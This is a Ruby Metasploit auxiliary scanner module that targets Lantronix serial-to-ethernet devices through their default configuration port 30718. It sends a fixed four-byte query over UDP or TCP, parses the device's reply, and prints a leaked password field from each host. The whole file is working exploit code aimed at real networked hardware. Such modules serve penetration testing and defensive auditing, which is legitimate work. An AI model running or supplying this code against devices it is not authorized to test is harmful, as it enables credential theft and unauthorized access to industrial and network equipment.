##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix leak exploitation` via 77feh',
      'Description' => %q{
          This module exploits leak exploitation through RCR record on serial-to-ethernet
        devices via the config port (30718/udp/tcp, enabled by default).
      },
      'Author'      => 'kost',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718),
	OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ]),
        OptInt.new('COUNT', [ true,  'Number of times to perform dump', 1]),
        OptInt.new('SLEEP', [ true,  'Sleep for how many seconds between requests', 0])
      ], self.class)
  end

  def run_host(ip)
    lsock = nil
    res = nil

    datastore['COUNT'].times do
      begin
        if datastore['IPPROTO'] == 'udp' then
          vprint_status("#{rhost} - using UDP for communication.")
          lsock = Rex::Socket::Udp.create( {
            'LocalHost' => datastore['CHOST'] || nil,
            'PeerHost'  => ip,
            'PeerPort'  => datastore['RPORT'],
            'Context'   =>
            {
              'Msf' => framework,
              'MsfExploit' => self
            }
          })
        else
          vprint_status("#{rhost} - using TCP for communication.")
          lsock = connect
        end

        lsock.put("\x00\x00\x00\xF4")

        result = lsock.recvfrom(65535, 10) and result[1]
        res = result[0]
        vprint_status("#{rhost} - got #{Rex::Text.to_hex_dump(res)}")

        if res and res.length > 18 and res[0,4] == "\x00\x00\x00\xF5"
            # vprint_status("#{rhost} - Got packet with expected size.")
            simplepass = res[12,4] 
            if simplepass == "\x00\x00\x00\x00"
              print_status("#{rhost} - Leak: disabled.")
            else
              print_good("#{rhost} - Leak: #{simplepass.to_s} (#{Rex::Text.to_hex_dump(simplepass.to_s)})")
            end
        else
          print_status("#{rhost} - Unusual response from host")
        end

      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
        print_error("Connection error")
      rescue ::Interrupt
        raise $!
      rescue ::Exception => e
        print_error("Unknown error: #{e.class} #{e}")
      ensure
        lsock.close if lsock
      end
      vprint_status("#{rhost} - Sleeping for #{datastore['SLEEP']}")
      sleep datastore["SLEEP"]
    end
  end

end
